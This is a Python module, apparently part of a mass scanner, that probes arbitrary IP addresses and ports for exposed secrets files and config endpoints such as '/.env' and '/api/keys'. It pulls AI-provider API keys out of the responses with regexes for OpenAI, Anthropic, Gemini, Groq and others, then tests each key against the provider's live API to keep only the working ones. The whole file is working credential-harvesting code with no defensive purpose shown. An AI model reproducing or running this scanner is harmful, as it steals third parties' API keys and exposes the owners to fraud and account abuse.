"""
HTTP probe — fires HTTP requests at discovered ports to find API key panels.
Shared session, focused endpoints, no overhead.
"""
import re
import logging
import asyncio
from typing import Optional
import aiohttp

logger = logging.getLogger(__name__)

TARGET_ENDPOINTS = [
    "/api/settings", "/.env", "/config.js", "/api/config",
    "/config.json", "/env", "/server.js", "/app.js",
    "/settings", "/admin/settings", "/api/keys", "/keys",
    "/api/v1/settings", "/config", "/dashboard",
    "/.env.local", "/.env.production", "/env.js", "/env.json",
    "/api/env", "/api/.env", "/debug", "/api/debug",
    "/panel", "/litellm/config", "/proxy/config",
    "/api/providers", "/providers", "/v1/config",
]

KEY_PATTERNS = {
    "OpenAI": re.compile(r'sk-(?:proj-|live-|test-)?[A-Za-z0-9]{20,}(?:T3BlbkFJ[A-Za-z0-9]{20,})?'),
    "Gemini": re.compile(r'AIza[0-9A-Za-z_-]{35}'),
    "OpenRouter": re.compile(r'sk-or-v1-[A-Za-z0-9]{40,}'),
    "DeepSeek": re.compile(r'sk-[a-f0-9]{32,}'),
    "Anthropic": re.compile(r'sk-ant-api03-[A-Za-z0-9_-]{40,}'),
    "HuggingFace": re.compile(r'hf_[A-Za-z0-9]{34,}'),
    "TogetherAI": re.compile(r'together-[A-Za-z0-9]{20,}'),
    "Groq": re.compile(r'gsk_[A-Za-z0-9]{20,}'),
    "Perplexity": re.compile(r'pplx-[A-Za-z0-9]{20,}'),
}

VALIDATION_ENDPOINTS = {
    "OpenAI": {"url": "https://api.openai.com/v1/models", "headers": lambda k: {"Authorization": f"Bearer {k}"}, "success_check": lambda r: r.status == 200},
    "Gemini": {"url": "https://generativelanguage.googleapis.com/v1beta/models?key={key}", "headers": lambda k: {}, "success_check": lambda r: r.status == 200},
    "OpenRouter": {"url": "https://openrouter.ai/api/v1/auth/key", "headers": lambda k: {"Authorization": f"Bearer {k}"}, "success_check": lambda r: r.status == 200},
    "DeepSeek": {"url": "https://api.deepseek.com/v1/models", "headers": lambda k: {"Authorization": f"Bearer {k}"}, "success_check": lambda r: r.status == 200},
    "Anthropic": {"url": "https://api.anthropic.com/v1/models", "headers": lambda k: {"Authorization": f"Bearer {k}", "anthropic-version": "2023-06-01"}, "success_check": lambda r: r.status == 200},
    "HuggingFace": {"url": "https://huggingface.co/api/models?limit=1", "headers": lambda k: {"Authorization": f"Bearer {k}"}, "success_check": lambda r: r.status == 200},
}


class FoundKey:
    def __init__(self, provider: str, key: str, source_ip: str, source_port: int, endpoint: str):
        self.provider = provider
        self.key = key
        self.source_ip = source_ip
        self.source_port = source_port
        self.endpoint = endpoint
        self.validated = None

    def __repr__(self):
        return f"<{self.provider}:{self.key[:16]}... @ {self.source_ip}:{self.source_port}{self.endpoint}>"


class HTTPProbe:
    """Probes IP:port for API keys using a shared session per port."""

    def __init__(self, timeout: float = 3.0):
        self.timeout = timeout
        self.connector = aiohttp.TCPConnector(limit=0, force_close=True, ttl_dns_cache=30)

    async def probe_ip_port(self, ip: str, port: int) -> list[FoundKey]:
        found = []
        async with aiohttp.ClientSession(connector=self.connector) as session:
            for ep in TARGET_ENDPOINTS:
                url = f"http://{ip}:{port}{ep}"
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout), ssl=False) as resp:
                        if resp.status in (200, 401, 403):
                            text = await resp.text()
                            found.extend(self._extract(text, ip, port, ep))
                except (asyncio.TimeoutError, aiohttp.ClientError, Exception):
                    continue
        return found

    def _extract(self, text: str, ip: str, port: int, endpoint: str) -> list[FoundKey]:
        found = []
        for provider, pattern in KEY_PATTERNS.items():
            for match in pattern.findall(text):
                found.append(FoundKey(provider, match, ip, port, endpoint))
        return found


class KeyValidator:
    """Validates keys against provider APIs."""

    def __init__(self, timeout: float = 8.0):
        self.timeout = timeout
        self.connector = aiohttp.TCPConnector(limit=100)

    async def validate(self, key: FoundKey) -> Optional[FoundKey]:
        prov = key.provider
        if prov not in VALIDATION_ENDPOINTS:
            return None
        cfg = VALIDATION_ENDPOINTS[prov]
        url = cfg["url"].format(key=key.key) if "{key}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"](key.key)
        try:
            async with aiohttp.ClientSession(connector=self.connector) as s:
                async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=self.timeout), ssl=True) as r:
                    if cfg["success_check"](r):
                        key.validated = True
                        return key
        except Exception:
            pass
        key.validated = False
        return None

    async def validate_batch(self, keys: list[FoundKey]) -> list[FoundKey]:
        tasks = [self.validate(k) for k in keys]
        results = await asyncio.gather(*tasks)
        return [r for r in results if r is not None and r.validated]
